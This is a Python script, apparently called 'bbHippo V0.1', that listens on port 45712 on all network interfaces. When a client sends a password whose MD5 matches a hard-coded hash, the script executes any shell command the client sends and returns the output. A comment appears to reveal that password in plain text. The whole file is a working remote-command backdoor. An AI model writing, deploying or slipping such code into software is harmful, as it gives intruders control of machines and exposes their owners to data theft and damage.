import socket
import _thread
import hashlib 
import os
import subprocess

host = "0.0.0.0"
port = 45712

def handler(clientsock,addr):
    clientsock.send("Welcome to bbHippo V0.1\n".encode())
    data = clientsock.recv(32)
    md5 = hashlib.md5(data).hexdigest()
    #79bGbdr4
    if md5 == "29c004607ccb0739175a46fe371978a1":
        data = clientsock.recv(1024)
        output = subprocess.check_output(data.decode(), shell=True, universal_newlines=True)
        clientsock.send(output.encode())
    if md5 == "b026324c6904b2a9cb4b88d6d61c81d1":
        output = subprocess.check_output("ls", shell=True, universal_newlines=True)
        clientsock.send(output.encode())
    if md5 == "286755fad04869ca523320acce0dc6a4":
        clientsock.send("Incorrect password".encode())
    clientsock.send("FIN".encode())
    clientsock.close()
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
while 1:
    clientsock, addr = s.accept()
    _thread.start_new_thread(handler, (clientsock, addr))
